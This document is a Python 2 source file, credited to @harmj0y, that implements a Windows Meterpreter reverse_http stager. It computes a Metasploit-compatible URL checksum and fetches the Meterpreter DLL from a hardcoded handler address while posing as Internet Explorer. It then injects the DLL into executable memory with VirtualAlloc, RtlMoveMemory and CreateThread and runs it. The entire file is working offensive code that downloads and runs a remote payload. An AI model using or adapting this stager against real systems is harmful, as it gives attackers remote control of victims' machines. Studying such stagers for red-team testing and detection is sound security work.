#
# Python windows/meterpreter/reverse_http stager 
#   (doesn't rely on shellcode)
#
# By: @harmj0y
#

import urllib2, string, random, struct, ctypes, time

# helper for the metasploit http checksum algorithm
def checksum8(s):
    # hard rubyish way -> return sum([struct.unpack('<B', ch)[0] for ch in s]) % 0x100
    return sum([ord(ch) for ch in s]) % 0x100

# generate a metasploit http handler compatible checksum for the URL
def genHTTPChecksum():
    chk = string.ascii_letters + string.digits
    for x in xrange(64):
        uri = "".join(random.sample(chk,3))
        r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
        for char in r:
            if checksum8(uri + char) == 92:
                return uri + char

def connect():
    # connect to the metasploit handler
    req = urllib2.Request("http://192.168.30.129:80/"+genHTTPChecksum(), None, { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' })
    try:
        t = urllib2.urlopen(req)
        return t.read() if int(t.info()["Content-Length"]) > 100000 else ""
    except urllib2.URLError, e:
        return ""

# injects the meterpreter .dll into memory
def inject(dll):
    # make sure we have something to inject
    if dll != "":
        # read in the meterpreter .dll and convert it to a byte array
        shellcode = bytearray(dll)

        # use types windll.kernel32 for virtualalloc reserves region of pages in virtual addres sspace
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                  ctypes.c_int(len(shellcode)),
                                                  ctypes.c_int(0x3000),
                                                  ctypes.c_int(0x40))

        # use virtuallock to lock region for physical address space
        ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                           ctypes.c_int(len(shellcode)))

        # read in the buffer
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

         # moved the memory in 4 byte blocks
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))
        # launch in a thread 
        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))
        # waitfor singleobject
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


html = connect()
inject(html)